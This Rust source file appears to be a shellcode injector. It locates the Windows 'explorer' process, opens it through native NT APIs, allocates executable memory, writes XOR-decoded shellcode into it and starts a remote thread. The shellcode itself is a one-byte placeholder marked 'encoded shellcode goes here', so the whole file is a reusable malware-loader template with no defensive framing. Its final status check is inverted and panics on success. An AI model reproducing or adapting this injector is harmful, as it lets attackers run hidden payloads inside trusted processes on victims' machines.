use sysinfo::{Pid, ProcessExt, SystemExt};

use std::{
    default::Default,
    ffi::c_void,
    ptr::null_mut,
};

use ntapi::{
    ntpsapi::{NtOpenProcess, NtCreateThreadEx},
    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
    ntapi_base::{CLIENT_ID}
};

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};

fn main() {
    let process_id = get_process_id_by_name("explorer");

    println!("process ID: {}", process_id);

    inject_shellcode(process_id);
}

fn inject_shellcode(process_id: Pid) {

    unsafe {
        let mut oa = OBJECT_ATTRIBUTES::default();

        let mut process_handle = process_id as HANDLE;

        let mut ci = CLIENT_ID {
            UniqueProcess: process_handle,
            UniqueThread: null_mut(),
        };


        let mut status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);

        if !NT_SUCCESS(status) {
            panic!("Error opening process: {}", status);
        }

        //encoded shellcode goes here
        let buf : Vec<u8> = vec![0x90];

        let mut shellcode : Vec<u8> = Vec::with_capacity(buf.len());
        for x in &buf {
            shellcode.push(*x ^ 0xBA);
        }

        println!("{:?}",shellcode);

        let mut shellcode_length = shellcode.len();

        println!("{}", shellcode_length);

        let handle = process_handle as *mut c_void;
        let mut base_address : *mut c_void = null_mut();
        status = NtAllocateVirtualMemory(handle, &mut base_address, 0, &mut shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        if !NT_SUCCESS(status) {
            panic!("Error allocating  memory to the target process: {}", status);
        }

        let mut bytes_written = 0;

        let buffer = shellcode.as_mut_ptr() as *mut c_void;
        let buffer_length = shellcode.len();

        status = NtWriteVirtualMemory(handle, base_address, buffer, buffer_length, &mut bytes_written);

        if !NT_SUCCESS(status) {
            panic!("Error writing shellcode to memory of the target process: {}", status);
        }

        let mut thread_handle : *mut c_void = null_mut();

        status = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, base_address, null_mut(), 0, 0, 0, 0, null_mut());

        if NT_SUCCESS(status) {
            panic!("Error failed to create remote thread: {}", status);
        }
    }   
}

fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}